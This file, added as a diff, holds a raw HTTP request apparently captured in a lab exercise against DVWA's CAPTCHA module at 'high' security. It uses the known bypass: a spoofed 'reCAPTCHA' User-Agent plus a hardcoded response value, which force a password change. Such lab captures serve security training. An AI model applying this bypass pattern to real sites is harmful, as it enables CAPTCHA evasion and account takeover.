@@ -1,0 +1,16 @@
+POST /DVWA/vulnerabilities/captcha/ HTTP/1.1
+Host: 192.168.56.105
+Content-Length: 143
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://192.168.56.105
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: reCAPTCHA
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.56.105/DVWA/vulnerabilities/captcha/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=092e411ca206f35d1920573f79fa92c0; security=high
+Connection: keep-alive
+
+step=1&password_new=password&password_conf=password&g-recaptcha-response=hidd3n_valu3&user_token=8e22770379d975834e186ed69dcd7bab&Change=Change
